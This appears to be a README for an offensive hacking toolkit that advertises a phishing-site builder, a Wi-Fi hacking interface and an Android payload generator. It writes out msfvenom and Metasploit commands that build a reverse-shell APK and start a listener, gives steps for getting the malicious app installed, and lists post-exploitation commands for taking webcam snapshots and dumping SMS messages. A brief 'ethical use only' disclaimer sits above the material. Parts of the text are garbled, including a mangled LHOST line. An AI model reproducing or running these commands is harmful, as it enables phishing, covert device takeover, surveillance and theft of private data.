# AVITOOLTION-Phishing
"Hello my friends, this tool will help you design a phishing site easily without needing much understanding or programming. There are also many features to discover. You should download the tool, and as you do, I thank you very much.

# Payload PDF.py #
" msfvenom -p android/meterpreter/reverse_tcp LHOST=your_IP LPORT=your_PORT -o payload.apk "
" Payload PDF.py "
" use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST your_IPOpen-XAI.py
set LPORT your_PORT
exploit "

# Open-XAI.py #

" python3 chat_ai.py "

# Phishing.py #

" python3 Phishing.py "

# Tkinter-haking-wifi.py #

arabic :
هذا الملف الرمحي لبايثون الذي يحتوي على واجهة جيدة لتسهيل عملية الاختراق للوايفاي على المستعمل،وشكرا
English :
This is a Python spear file that contains a good interface to facilitate the process of hacking Wi-Fi for the user. Thank you.


# Android Payload Generator (for Penetration Testing Only)

> ⚠️ **Disclaimer:**  
> This tool is intended for **educational and ethical penetration testing purposes only**.  
> Do **NOT** use it on devices or networks you do not own or have explicit permission to test.  
> The author is not responsible for any misuse.

---

## 📌 Project Description

This script helps you generate a malicious APK payload for Android using `msfvenom` and automatically starts a Metasploit listener to capture the session when the APK is executed on the Android device.

---

## 🧰 Requirements

- Kali Linux or any penetration testing distro
- Installed tools:
  - `msfvenom` (part of Metasploit)
  - `msfconsole`
  - `xterm`
- A rooted or test Android device on the same local network
- Network IP (e.g., `192.168.1.9`)

---

## ⚙️ How It Works

1. Generates a `reverse_tcp` payload for Android (`android/meterpreter/reverse_tcp`)
2. Saves it as an APK file (`android_payload.apk`)
3. Creates a `listener.rc` file for Metasploit to handle the connection
4. Launches `msfconsole` in a new terminal window with the listener preloaded

---

## 🚀 Usage

1. Clone or download this project.
2. Make the script executable:

```bash
chmod +x android_payload.sh

./android_payload.sh

## Transfer the generated android_payload.apk to your Android test device. ##

Install the APK (enable "Unknown Sources" in Android settings).


Launch the app on the Android device — the session will appear in Metasploit.

📂 Files Generated
File	Description
android_payload.apk	The malicious APK file (reverse shell)
listener.rc	Script for auto-starting MSF handler

🧪 Metasploit Commands (once session is active)
bash
نسخ الكود
sessions         # List active sessions
sessions -i 1    # Interact with session 1
sysinfo          # Get device info
webcam_snap      # Take a snapshot using front cam
dump_sms         # Extract SMS (if permissions allow)
